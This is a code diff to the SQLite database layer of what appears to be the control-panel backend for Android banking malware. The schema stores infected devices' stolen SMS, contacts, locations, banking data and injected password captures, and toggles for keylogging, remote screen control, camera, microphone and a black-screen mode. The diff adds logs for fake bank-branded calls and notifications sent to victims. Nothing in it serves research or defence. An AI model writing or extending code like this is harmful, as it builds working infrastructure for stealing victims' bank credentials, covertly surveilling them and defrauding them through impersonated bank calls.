@@ -6,10 +6,12 @@ const fs = require('fs');
 const DB_FILE = process.env.DB_PATH || path.join(__dirname, 'oxy.db');
 const dbDir = path.dirname(DB_FILE);
 if (!fs.existsSync(dbDir)) fs.mkdirSync(dbDir, { recursive: true });
-const db      = new Database(DB_FILE);
+
+const db = new Database(DB_FILE);
 db.pragma('journal_mode = WAL');
 db.pragma('synchronous  = NORMAL');
 db.pragma('foreign_keys = ON');
+db.pragma('cache_size   = -32000'); // 32MB cache
 
 db.exec(`
 CREATE TABLE IF NOT EXISTS devices (
@@ -154,8 +156,22 @@ CREATE TABLE IF NOT EXISTS inject_passwords (
 
 CREATE TABLE IF NOT EXISTS fake_call_log (
   id INTEGER PRIMARY KEY AUTOINCREMENT,
-  device_id TEXT, caller_name TEXT, status TEXT, ts INTEGER
+  device_id TEXT, caller_name TEXT, caller_number TEXT DEFAULT '',
+  bank TEXT DEFAULT '', status TEXT, ts INTEGER
 );
+CREATE INDEX IF NOT EXISTS idx_fcl_dev ON fake_call_log(device_id, ts DESC);
+
+CREATE TABLE IF NOT EXISTS notifications_log (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  device_id TEXT,
+  title      TEXT DEFAULT '',
+  message    TEXT DEFAULT '',
+  bank       TEXT DEFAULT '',
+  is_call    INTEGER DEFAULT 0,
+  status     TEXT DEFAULT 'sent',
+  ts         INTEGER
+);
+CREATE INDEX IF NOT EXISTS idx_nl_dev ON notifications_log(device_id, ts DESC);
 
 CREATE TABLE IF NOT EXISTS stored_apks (
   id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -163,22 +179,20 @@ CREATE TABLE IF NOT EXISTS stored_apks (
 );
 `);
 
-// ── FIX BUG 1: cache setField prepared statements per column name ─────────────
+// ── setField: safe per-column UPDATE ──────────────────────────────────────────
 const _setFieldCache = new Map();
+const ALLOWED_FIELDS = new Set([
+  'vnc_active','camera_active','mic_active','keylogger_active',
+  'screen_reader_active','black_screen_active','killer_mode',
+  'banks_crypter','nfc_active','threat_level','inject_count',
+  'is_online','last_seen','battery_level','is_charging',
+  'admin_active','accessibility_active',
+  'days_since_install',
+]);
 function setField(field, deviceId, value) {
-  if (!_setFieldCache.has(field)) {
-    // Only allow whitelisted column names — prevents any SQL injection
-    const ALLOWED = new Set([
-      'vnc_active','camera_active','mic_active','keylogger_active',
-      'screen_reader_active','black_screen_active','killer_mode',
-      'banks_crypter','nfc_active','threat_level','inject_count',
-      'is_online','last_seen','battery_level','is_charging',
-      'admin_active','accessibility_active','stealth_mode',
-      'days_since_install',
-    ]);
-    if (!ALLOWED.has(field)) throw new Error(`setField: disallowed column "${field}"`);
+  if (!ALLOWED_FIELDS.has(field)) throw new Error(`setField: disallowed column "${field}"`);
+  if (!_setFieldCache.has(field))
     _setFieldCache.set(field, db.prepare(`UPDATE devices SET ${field}=? WHERE device_id=?`));
-  }
   return _setFieldCache.get(field).run(value, deviceId);
 }
 
@@ -248,9 +262,9 @@ const q = {
   getSms:    db.prepare(`SELECT * FROM sms WHERE device_id=? ORDER BY date DESC LIMIT 200`),
 
   // ── Contacts ─────────────────────────────────────────────────────────────────
-  clearContacts:  db.prepare(`DELETE FROM contacts WHERE device_id=?`),
-  insertContact:  db.prepare(`INSERT INTO contacts (device_id,name,number) VALUES (?,?,?)`),
-  getContacts:    db.prepare(`SELECT * FROM contacts WHERE device_id=? ORDER BY name ASC`),
+  clearContacts: db.prepare(`DELETE FROM contacts WHERE device_id=?`),
+  insertContact: db.prepare(`INSERT INTO contacts (device_id,name,number) VALUES (?,?,?)`),
+  getContacts:   db.prepare(`SELECT * FROM contacts WHERE device_id=? ORDER BY name ASC`),
 
   // ── Banking ──────────────────────────────────────────────────────────────────
   insertBanking: db.prepare(`INSERT INTO banking_data (device_id,bank,data_type,payload,ts) VALUES (?,?,?,?,?)`),
@@ -283,11 +297,9 @@ const q = {
   getApps:   db.prepare(`SELECT * FROM installed_apps WHERE device_id=? ORDER BY is_bank DESC, inject_active DESC, app_name ASC`),
   deleteApp: db.prepare(`DELETE FROM installed_apps WHERE device_id=? AND package_name=?`),
 
-  // ── Files — FIX BUG 8: UNIQUE(device_id,path) → INSERT OR REPLACE ────────────
-  upsertFiles: db.prepare(`
-    INSERT OR REPLACE INTO file_listings (device_id,path,files,ts) VALUES (?,?,?,?)
-  `),
-  getFiles: db.prepare(`SELECT * FROM file_listings WHERE device_id=? AND path=? ORDER BY ts DESC LIMIT 1`),
+  // ── Files ────────────────────────────────────────────────────────────────────
+  upsertFiles: db.prepare(`INSERT OR REPLACE INTO file_listings (device_id,path,files,ts) VALUES (?,?,?,?)`),
+  getFiles:    db.prepare(`SELECT * FROM file_listings WHERE device_id=? AND path=? ORDER BY ts DESC LIMIT 1`),
 
   // ── Location ─────────────────────────────────────────────────────────────────
   insertLoc: db.prepare(`INSERT INTO location_history (device_id,lat,lng,accuracy,address,ts) VALUES (?,?,?,?,?,?)`),
@@ -323,8 +335,12 @@ const q = {
   getInjectPws:   db.prepare(`SELECT * FROM inject_passwords WHERE device_id=? ORDER BY ts DESC LIMIT 100`),
 
   // ── Fake call log ────────────────────────────────────────────────────────────
-  insertFakeCall: db.prepare(`INSERT INTO fake_call_log (device_id,caller_name,status,ts) VALUES (?,?,?,?)`),
+  insertFakeCall: db.prepare(`INSERT INTO fake_call_log (device_id,caller_name,caller_number,bank,status,ts) VALUES (?,?,?,?,?,?)`),
   getFakeCalls:   db.prepare(`SELECT * FROM fake_call_log WHERE device_id=? ORDER BY ts DESC LIMIT 50`),
+
+  // ── Notifications log ─────────────────────────────────────────────────────────
+  insertNotif: db.prepare(`INSERT INTO notifications_log (device_id,title,message,bank,is_call,status,ts) VALUES (?,?,?,?,?,?,?)`),
+  getNotifs:   db.prepare(`SELECT * FROM notifications_log WHERE device_id=? ORDER BY ts DESC LIMIT 50`),
 
   // ── APKs ─────────────────────────────────────────────────────────────────────
   getApks:   db.prepare(`SELECT * FROM stored_apks ORDER BY ts DESC`),
